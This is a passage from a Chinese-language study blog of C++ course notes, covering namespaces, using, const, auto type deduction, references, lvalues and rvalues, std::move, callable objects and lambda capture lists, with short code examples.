class="comment">//报错，不知道调用哪个test函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决(使用命名空间)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;   </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	B::<span class="built_in">test</span>();</span><br><span class="line">    A::<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>顺便提两点</strong></p>
<p>命名空间的实现原理，C++最后都要转化为C来执行程序。在namespace A中定义的Test类，其实全名是A::Test。C++所有特有的库（指c没有的库）,都使用了std的命名空间。比如最常用的iostream。</p>
<p><strong>using关键字设计的目的之一就是为了简化命名空间的。using关键字在命名空间方面主要有两种用法。</strong></p>
<ol>
<li><p><strong>using 命名空间::变量名</strong>。这样以后使用此变量时只要使用变量名就可以了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> A::test;</span><br><span class="line"><span class="keyword">using</span> B::test;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>using namspce 命名空间</strong>。这样，每一个变量都会在该命名空间中寻找。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> B;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>所以，头文件中一定不能使用using关键字。会导致命名空间的污染</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">错误代码</span><br><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="C-的标准输入输出简介"><a href="#C-的标准输入输出简介" class="headerlink" title="(*)C++的标准输入输出简介"></a>(*)C++的标准输入输出简介</h2><p>输入输出简单来说就是数据在输入设备，内存，硬盘，输出设备之间移动的过程。</p>
<p>c语言设定了很多不相关的函数还实现这些过程。</p>
<p>比如printf就是让数据从内存到显示屏（显示屏就是输出设备）。scanf就是让数据从键盘（键盘是输入设备）到内存。此外还有从内存到磁盘的文件操作函数。</p>
<p> c语言的函数虽然简单方便，但彼此之间没有关联。C++有了继承功能，可以让子类与父类之间有关联性，极大的提高各种输入输出功能之间的耦合性。</p>
<p>于是C++用继承功能重写了输入输出功能，这就是io库，io库引入了“流”的概念，数据从一个地方到另一个地方，原本地方的数据就没了，叫做流很贴切。</p>
<p> io库是一个很大的部分，但现阶段我们只要会使用输入输出流，cout和cin就可以了。</p>
<p>cout可以让数据从内存流到输出设备，cin可以让数据从输入设备流到内存。</p>
<h2 id="const关键字的介绍"><a href="#const关键字的介绍" class="headerlink" title="const关键字的介绍"></a>const关键字的介绍</h2><p>const是让编译器将变量视为常量，用const修饰的变量和真正的常量有本质的区别。</p>
<ol>
<li><p>真正的常量存储在<strong>常量区</strong>或<strong>代码区</strong>，比如“abcdefg”这个字符串就存储在常量区，而“3”，“100”这些数字就存储在代码区中，这些都是真正的常量，<strong>无法用任何方式修改。</strong></p>
</li>
<li><p>const修饰的变量仍然存储在<strong>堆区</strong>或<strong>栈区</strong>中，<strong>从内存分布的角度讲，和普通变量没有区别。</strong>const修饰的变量并非不可更改的，C++本身就提供了mutable关键字（这个关键字在Part3就会讲的）用来修改const修饰的变量，从汇编的角度讲，const修饰的变量也是可以修改的。</p>
</li>
</ol>
<h2 id="auto关键词的使用"><a href="#auto关键词的使用" class="headerlink" title="(**)auto关键词的使用"></a>(**)auto关键词的使用</h2><p>auto是C++11新加入的关键字，就是为了简化一些写法。</p>
<p>为了学习auto的类型推断，我使用一个boost库来确定变量的具体类型。boost库很大，可以选择编译自己想要的模块，我就直接全部编译了。boost是很复杂的，不是几句话能说清楚，要深入理解可以去官网学习。</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">auto</span> i = <span class="number">100</span>;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>来说一下auto，有好几个点需要注意：</strong></p>
<p>**1.**auto只能推断出类型，引用不是类型，所以auto无法推断出引用，要使用引用只能自己加引用符号。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//输出类型int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**auto关键字在推断引用的类型时：会直接将引用替换为引用指向的对象。其实引用一直是这样的，引用不是对象，任何使用引用的地方都可以直接替换成引用指向的对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; refi = i;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.<strong>auto关键字在推断类型时，如果没有引用符号，会忽略值类型的const修饰，而保留修饰指向对象的const，典型的就是指针。</strong>可能有些不好理解，看看代码就好说了。3和4的主要作用对象就是指针.</strong></p>
<p>例子1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;<span class="comment">//前者const修饰的是指针pi修饰的值，后者const修饰的是pi，后者const会被忽略</span></span><br><span class="line">	<span class="keyword">auto</span> pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const *=const int *</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>**4.**auto关键字在推断类型时，如果有了引用符号，那么值类型的const和修饰指向对象的const都会保留。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span>&amp; pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const * const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>其实3，4为什么会出现这种情况，因为在传递值时，修改这个值并不会对原有的值造成影响。而传递引用时，修改这个值会直接对原有的值造成影响。</strong></p>
<p>**5.**当然，我们可以在前面加上const，这样永远都有const的含义。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>auto不会影响编译速度，甚至会加快编译速度。因为编译器在处理XX a &#x3D; b时，当XX是传统类型时，编译期需要检查b的类型是否可以转化为XX。当XX为auto时，编译期可以按照b的类型直接给定变量a的类型，所以效率相差不大，甚至反而还有提升。</li>
<li>（*）最重要的一点，就是auto不要滥用，对于一些自己不明确的地方不要乱用auto，否则很可能出现事与愿违的结果，使用类型应该安全为先。</li>
<li>（*）auto主要用在与模板相关的代码中，一些简单的变量使用模板常常导致可读性下降，经验不足还会导致安全性问题。</li>
</ol>
<h2 id="静态变量，指针和引用"><a href="#静态变量，指针和引用" class="headerlink" title="(*)静态变量，指针和引用"></a>(*)静态变量，指针和引用</h2><p>变量的存储位置有三种，分别是静态变量区，栈区，堆区。</p>
<p>**1.**静态变量区在编译时就已经确定地址，存储全局变量与静态变量。</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> g_i = <span class="number">0</span>;<span class="comment">//全局变量，在程序编译时已经初始化</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">unsigned</span> callCount = <span class="number">0</span>;<span class="comment">//这行代码在编译时已经初始化，直接执行下一行</span></span><br><span class="line">	<span class="keyword">return</span> ++callCount;<span class="comment">//统计函数调用次数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="type">unsigned</span> testFuncCallCount = <span class="built_in">test</span>();</span><br><span class="line">	++g_i;<span class="comment">//程序运行时执行</span></span><br><span class="line">	std::cout &lt;&lt; testFuncCallCount &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**指针都是存储在栈上和堆上，不管在栈上还是堆上，都一定有一个地址。</p>
<p>本质上说，指针和普通变量没有区别。</p>
<p>在32位系统中，int变量和指针都是32位。指针必须和“&amp;”，“*”这两个符号一起使用才有意义。</p>
<p>&amp;a代表的a这个变量的地址，a代表的a对应地址存储的值，*a代表对应地址存储的值作为地址对应的值。</p>
<p>所以指针才可以灵活的操作内存，但这也带来了严重的副作用，比如指针加加减减就可以操作内存，所以引用被发明了，引用就是作用阉割的指针（可以视为“类型*const”，所以引用必须上来就赋初值，不能设置为空），编译器不将其视作对象，操作引用相当于操作引用指向的对象。也就从根本是杜绝了引用篡改内存的能力。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span>&amp; refI=i;<span class="comment">//类似于int* const pi=&amp;i;</span></span><br></pre></td></tr></table></figure>

<h2 id="左值，右值，左值引用，右值引用"><a href="#左值，右值，左值引用，右值引用" class="headerlink" title="(**)左值，右值，左值引用，右值引用"></a>(**)左值，右值，左值引用，右值引用</h2><p><strong>1.左值和右值</strong></p>
<p>C++任何一个对象要么是左值，要么是右值。比如int i &#x3D; 10，i和10都是对象</p>
<p><strong>左值：</strong>拥有地址属性的对象就叫左值，左值可以放在等号右边，也可以放在等号左边</p>
<p><strong>右值：</strong>不是左值的对象就是右值。无法操作地址属性的对象就是右值。比如临时对象，就都是右值，临时对象的地址属性无法使用。注意：左值也可以放在“&#x3D;”右面，但右值绝对不可以放在等号左面</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> i2=i+<span class="number">1</span>;<span class="comment">//i+1为临时对象，有地址但无法使用地址</span></span><br><span class="line">++i；<span class="comment">//左值 i++为右值</span></span><br></pre></td></tr></table></figure>

<p><strong>2.引用的分类</strong></p>
<p>(1) 普通左值引用：就是一个对象的别名，只能绑定左值，无法绑定常量对象。</p>
<p>(2) const左值引用：可以对常量起别名，可以绑定左值和右值</p>
<p>(3) 只能绑定右值的引用。</p>
<p>(4) 万能引用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span>&amp; refi=i;<span class="comment">//只能绑定左值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; i;<span class="comment">//绑定左值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; (i+<span class="number">1</span>);<span class="comment">//绑定右值</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=(i+<span class="number">1</span>);<span class="comment">//右值引用</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=i++;<span class="comment">//右值引用</span></span><br></pre></td></tr></table></figure>

<h2 id="move函数，临时对象"><a href="#move函数，临时对象" class="headerlink" title="(**)move函数，临时对象"></a>(**)move函数，临时对象</h2><p><strong>1.move函数</strong></p>
<p>(1) 右值看重对象的值而不考虑地址，move函数可以对一个左值使用，使操作系统不再在意其地址属性，将其完全视作一个右值。</p>
<p>(2) move函数让操作的对象失去了地址属性，<strong>所以我们有义务保证以后不再使用该变量的地址属性，简单来说就是不再使用该变量，因为左值对象的地址是其使用时无法绕过的属性。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=std::<span class="built_in">move</span>(i);<span class="comment">//std::move(i)整体是个右值，i能继续赋值</span></span><br></pre></td></tr></table></figure>

<p><strong>2.临时对象</strong></p>
<p><strong>右值都是不体现地址的对象。那么，还有什么能比临时对象更加没有地址属性呢？右值引用主要负责处理的就是临时对象。</strong></p>
<p>程序执行时生成的中间对象就是临时对象，注意，所有的临时对象都是右值对象，因为临时对象产生后很快就可能被销毁，使用的是它的值属性。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;<span class="comment">//return 的是一个临时对象，所有的临时对象都是右值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>&amp;&amp; rrefi=<span class="built_in">getI</span>();<span class="comment">//接收不到就会销毁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="可调用对象"><a href="#可调用对象" class="headerlink" title="(**)可调用对象"></a>(**)可调用对象</h2><p>如果一个对象可以使用调用运算符“()”，()里面可以放参数，这个对象就是可调用对象。</p>
<p><strong>1.函数：</strong>函数自然可以调用()运算符，是最典型的可调用对象</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> pf_type = <span class="built_in">void</span>(*)(<span class="type">int</span>);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunc</span><span class="params">(pf_type pf, <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">pf</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">myFunc</span>(test,<span class="number">200</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>2.仿函数：</strong>具有operator()函数的类对象，此时类对象可以当做函数使用，因此称为仿函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;void operator()(int i)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="built_in">t</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>3.lambda表达式</strong></p>
<p>就是匿名函数，普通的函数在使用前需要找个地方将这个函数定义，于是C++提供了lambda表达式，需要函数时直接在需要的地方写一个lambda表达式，省去了定义函数的过程，增加开发效率。</p>
<p><strong>注意：lambda表达式很重要，</strong>现代C++程序中，lambda表达式是大量使用的</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	[i] (<span class="type">int</span> elem) &#123;</span><br><span class="line">		std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;(<span class="number">200</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>lambda表达式的格式</strong>最少是“[] {}”，完整的格式为“[] () -&gt;ret {}”。</p>
<p>lambda各组件介绍</p>
<p>lambda各个组件介绍</p>
<p><strong>1.</strong>[]代表捕获列表：表示lambda表达式可以访问前文的哪些变量。</p>
<p>(1) []表示不捕获任何变量。</p>
<p>(2) [&#x3D;]：表示按值捕获所有变量。</p>
<p>(3) [&amp;]：表示按照引用捕获所有变量。</p>
<p>&#x3D;，&amp;也可以混合使用，比如</p>
<p>(4) [&#x3D;, &amp;i]：表示变量i用引用传递，除i的所有变量用值传递。</p>
<p>(5) [&amp;, i]：表示变量i用值传递，除i的所有变量用引用传递。</p>
<p>当然，也可以捕获单独的变量</p>
<p>(6) [i]：表示以值传递的形式捕获i</p>
<p>(7) [&amp;i]：表示以引用传递的方式捕获i</p>
<p>啊，part1结束，下周一定减少划水时间，多听课</p>
<img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图 2023-03-06 160805.png" style="zoom:33%;">

<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类的权限修饰：c++通过 <strong>public、protected、private</strong> 三个关键字来控制成员变量和成员函数的访问权限，它们分别表示公有的、受保护的、私有的，被称为成员访问限定符。所谓访问权限，就是你能不能使用该类中的成员。</p>
